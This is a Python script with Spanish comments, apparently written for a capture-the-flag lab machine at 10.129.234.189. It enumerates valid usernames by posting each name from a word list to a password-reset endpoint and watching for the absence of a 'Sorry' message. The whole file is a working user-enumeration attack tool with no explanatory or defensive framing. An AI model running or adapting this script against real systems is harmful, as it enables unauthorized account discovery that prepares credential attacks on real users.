#!/bin/python3

import http.client
import re
import signal

# Colours
rojo_luminoso='\033[1;31m'
verde_luminoso='\033[1;32m'
amarillo_luminoso='\033[1;33m'
azul_luminoso='\033[1;34m'
magenta_luminoso='\033[1;35m'
cyan_luminoso='\033[1;36m'
blanco_luminoso='\033[1;37m'
sin_color='\033[0m'

# Funcion ctrl+c
def handler(signum, frame):
    msg = "[!] Saliendo..."
    print("")
    print(msg, end="", flush=True)
    print("")
    conn.close
    exit(1)

signal.signal(signal.SIGINT, handler)

# Definimos ip y puerto de la web
ip="10.129.234.189"
port=80


# Definir headers
header = {'Content-type': 'application/x-www-form-urlencoded'}


# Leemos usuairos
users = open('users.txt')
users = users.read().split('\n')

# Bucle para usuarios
for u in users:

    data = "username=" + u
    # Creamos conexion al servidor

    conn = http.client.HTTPConnection(ip,port)
    conn.request("POST", "/public/sendpassword.htm", body=data, headers=header)
    response = conn.getresponse()
    # Buscamos la cadena en la respuesta
    text = response.read().decode('utf-8')
    validation = re.findall("Sorry",text)
    # Si esta vacio no encontro la cadena por lo que si existe el usuario
    if not validation:
        print("\n" + amarillo_luminoso + "[*] " + blanco_luminoso + "El usuario " + amarillo_luminoso + u + blanco_luminoso + " existe" + sin_color)
        break

    conn.close



